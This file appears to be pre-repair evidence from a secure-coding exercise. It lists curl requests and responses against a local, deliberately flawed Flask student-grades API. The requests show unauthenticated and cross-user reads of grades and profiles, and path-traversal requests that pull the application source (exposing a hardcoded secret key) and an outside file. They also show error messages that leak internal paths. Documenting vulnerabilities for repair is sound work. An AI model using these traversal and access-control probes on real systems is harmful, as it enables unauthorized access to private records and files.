# Before the repair: curl output on the original application

Server: the original `baseline_secure_coding_api.py` (first commit, before any repair), started locally with `app.run(host='127.0.0.1', port=5055, debug=False)`. Port 5055 was used to avoid clashing with the usual 5001. `secret.txt` is a file created next to the application, outside `materials/`. In the commands and outputs below, the directory where the application was run is written `<APP_DIR>`.

## F03: grade and profile reads (authorization)

**No login: the session is empty**

```
$ curl -s -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/me
{"user":null}

HTTP 200
```

**No login: grades of student 1001**

```
$ curl -s -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/grades/1001
[{"course_id":"SRS","grade":14,"student_id":1001},{"course_id":"SSD","grade":16,"student_id":1001}]

HTTP 200
```

**No login: grades of student 1002**

```
$ curl -s -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/grades/1002
[{"course_id":"SRS","grade":15,"student_id":1002}]

HTTP 200
```

**No login: profile of student 1001**

```
$ curl -s -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/students/1001/profile
{"email":"alice@uc.pt","name":"Alice","program":"MEI","student_id":1001}

HTTP 200
```

**Login as alice (student 1001), then read Bob's grades**

```
$ curl -s -c alice.jar -o /dev/null -d "username=alice&password=alicepw" http://127.0.0.1:5055/login && curl -s -b alice.jar -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/grades/1002
[{"course_id":"SRS","grade":15,"student_id":1002}]

HTTP 200
```

**Login as prof_srs (professor of SRS only), then read Alice's grades**

```
$ curl -s -c prof.jar -o /dev/null -d "username=prof_srs&password=profpw" http://127.0.0.1:5055/login && curl -s -b prof.jar -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/grades/1001
[{"course_id":"SRS","grade":14,"student_id":1001},{"course_id":"SSD","grade":16,"student_id":1001}]

HTTP 200
```

**Malformed identifier**

```
$ curl -s -w "\nHTTP %{http_code}\n" http://127.0.0.1:5055/grades/abc
{"error":"invalid literal for int() with base 10: 'abc'","type":"ValueError"}

HTTP 500
```

## F06: path traversal in /files

**No login: a file inside the materials directory**

```
$ curl -s -w "\nHTTP %{http_code}\n" "http://127.0.0.1:5055/files?path=srs-summary.txt"
Secure Requirements Engineering summary
HTTP 200
```

**No login: relative traversal, first lines of the application source**

```
$ curl -s "http://127.0.0.1:5055/files?path=../baseline_secure_coding_api.py" | head -n 9
import dataclasses
import pathlib
import typing

import flask

app = flask.Flask(__name__)
app.config["SECRET_KEY"] = "dev-secret-key"
```

**No login: relative traversal to a file outside the directory**

```
$ curl -s -w "\nHTTP %{http_code}\n" "http://127.0.0.1:5055/files?path=../secret.txt"
TOP-SECRET-OUTSIDE

HTTP 200
```

**No login: absolute path**

```
$ curl -s -w "\nHTTP %{http_code}\n" --get --data-urlencode "path=<APP_DIR>/secret.txt" http://127.0.0.1:5055/files
TOP-SECRET-OUTSIDE

HTTP 200
```

**Missing file: internal path in the error**

```
$ curl -s -w "\nHTTP %{http_code}\n" "http://127.0.0.1:5055/files?path=nope.txt"
{"error":"[Errno 2] No such file or directory: '<APP_DIR>/materials/nope.txt'","type":"FileNotFoundError"}

HTTP 500
```
